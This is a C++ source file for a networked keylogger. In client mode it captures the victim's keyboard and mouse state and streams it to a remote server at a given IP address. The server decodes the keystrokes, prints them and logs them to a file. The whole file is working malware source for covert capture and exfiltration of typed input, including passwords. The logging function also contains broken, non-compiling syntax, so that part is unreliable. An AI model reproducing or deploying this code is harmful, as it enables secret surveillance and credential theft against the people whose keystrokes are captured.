#include "Keylogger.h"


namespace Mawi1e {
	Keylogger::Keylogger() {
		this->m_Input = nullptr;
		this->m_Network = nullptr;
	}

	Keylogger::Keylogger(const Keylogger&) {
	}

	Keylogger::~Keylogger() {
	}

	bool Keylogger::Initialize(int ServClnt, const char* ipAddress) {
		bool result;

		this->m_ServClnt = ServClnt;

		if (ServClnt == _Mawi1e_KEYLOGGER_CLIENT) {
			this->m_Input = new InputClass;
			if (this->m_Input == nullptr) {
				this->ErrorHandling("#M102");
				return false;
			}

			result = this->m_Input->Initialize();
			if (!result) {
				this->ErrorHandling("#M103");
				return false;
			}
		}


		this->m_Network = new NetworkClass;
		if (this->m_Network == nullptr) {
			this->ErrorHandling("#M100");
			return false;
		}

		result = true;
		if (ServClnt == _Mawi1e_KEYLOGGER_SERVER) {
			result = this->m_Network->Listen(RecvRoutine);
		}
		else if (ServClnt == _Mawi1e_KEYLOGGER_CLIENT) {
			result = this->m_Network->Connect(ipAddress);
		}

		if (!result) {
			this->ErrorHandling("#M101");
			return false;
		}

		return true;
	}

	void Keylogger::Shutdown() {
		if (this->m_Input) {
			this->m_Input->Shutdown();
			delete this->m_Input;
			this->m_Input = nullptr;
		}

		if (this->m_Network) {
			this->m_Network->Shutdown();
			delete this->m_Network;
			this->m_Network = nullptr;
		}

		return;
	}

	void Keylogger::Frame() {
		bool result;

		/** ------------------------------------------------------------------------
		[            Ŭ���̾�Ʈ�ϰ�� �Է°�������Ʈ�ϰ�, ������ ����              ]
		------------------------------------------------------------------------ **/
		for (;;) {
			if (this->m_ServClnt == _Mawi1e_KEYLOGGER_CLIENT) {
				result = this->m_Input->Frame();
				if (!result) {
					this->ErrorHandling("#M104");
					break;
				}

				KeyState keyState;
				auto[myKeyState, mouseX, mouseY] = this->m_Input->GetDeviceState();
				memcpy(keyState.keyboard, (const void*)myKeyState, 256);
				keyState.mouseX = mouseX;
				keyState.mouseY = mouseY;

				result = this->m_Network->SendKeyState(keyState, sizeof(keyState));
				if (!result) {
					this->ErrorHandling("#M105");
					break;
				}

				/** ------------------------------------------------------------------------
				[                             0.25�� ���ŷ                                ]
				------------------------------------------------------------------------ **/
				std::this_thread::sleep_for(std::chrono::microseconds(250));
			}
		}

		return;
	}

	void Keylogger::ErrorHandling(const char* ErrorMessage) {
		MessageBoxA(0, ErrorMessage, "##Warning##", MB_ICONWARNING);

		return;
	}
	void LogDatatoFile(int mouseX, int mouseY, char prevkey, char keyupper) {
		std::ofstream logFile("log.txt", std::ios::app);
		if (logFile) {
			logFile << "Mouse X : ", mouseX << "Mouse Y : "mouseY <<", PrevKey :"prevkey <<"KeyUpper : " << (keyupper? "Yes":"No : ) << std::end1;
			logFile.close();
		}
		else {
			std::cerr << "Fail to open log file" << std::endl;
		}
	}

	void __stdcall RecvRoutine(DWORD Erorr, DWORD Databytes, LPWSAOVERLAPPED lpOverlapped, DWORD Flags) {
		LPPER_IO ioData = (LPPER_IO)lpOverlapped;
		DWORD RecvFlags;
		int result;

		if (Databytes == 0) {
			/** ------------------------------------------------------------------------
			[                          Ŭ���̾�Ʈ ���� ����                            ]
			------------------------------------------------------------------------ **/
			std::cout << "[-] Client Disconnection.\n";

			closesocket(ioData->s);
			delete ioData;
			return;
		}

		KeyState keyState = {};

		/** ------------------------------------------------------------------------
		[              Ŭ���̾�Ʈ�κ��� �����޸𸮸� ���뱸��ü�� ����             ]
		------------------------------------------------------------------------ **/
		memcpy(&keyState, ioData->Message, sizeof(keyState));

		/** ------------------------------------------------------------------------
		[                        CapsLock ���(Toggle)����                         ]
		------------------------------------------------------------------------ **/
		ioData->capsLock = ((keyState.keyboard[DIK_CAPSLOCK] == 128) ? ioData->capsLock ? false : true : ioData->capsLock ? true : false);
		
		/** ------------------------------------------------------------------------
		[                            Ű������¸� �м�                             ]
		------------------------------------------------------------------------ **/
		auto[dik, upper, unClickedFlag] = AsciiStringAssembly(keyState.keyboard, ioData->capsLock);
		if (dik > 0) {
			if (ioData->prev_key != dik) {
				ioData->prev_key = dik;
			}
		}

		if (!unClickedFlag && ioData->key_upper != upper) {
			ioData->key_upper = upper;
		}
		ioData->key_upper = upper;
		/** ------------------------------------------------------------------------
		[                    DIK�� ASCII�� �ٲ۵�, �ַܼ� ���                     ]
		------------------------------------------------------------------------ **/
		SetConsoleCursorPosition(GetStdHandle(STD_OUTPUT_HANDLE), { 0, 0 });
		LogDatatoFile(keyState.mouseX, keyState.mouseY, ConvertDIKToAscii(ioData->prev_key, ioData->key_upper)[0], ioData->key_upper);
		std::cout << keyState.mouseX << ", " << keyState.mouseY << ", " << ConvertDIKToAscii(ioData->prev_key, ioData->key_upper) << "\t\t" << std::endl;

		/** ------------------------------------------------------------------------
		[                             Overlapped�ʱ�ȭ                             ]
		------------------------------------------------------------------------ **/
		memset(&ioData->overlapped, 0x00, sizeof(WSAOVERLAPPED));
		ioData->wsaBuf.len = 0x400;
		ioData->wsaBuf.buf = ioData->Message;
		RecvFlags = 0x00;

		result = WSARecv(ioData->s, &ioData->wsaBuf, 1, 0, &RecvFlags, &ioData->overlapped, RecvRoutine);
		if (result) {
			if (WSAGetLastError() != WSA_IO_PENDING) {
				return;
			}
		}
	}
}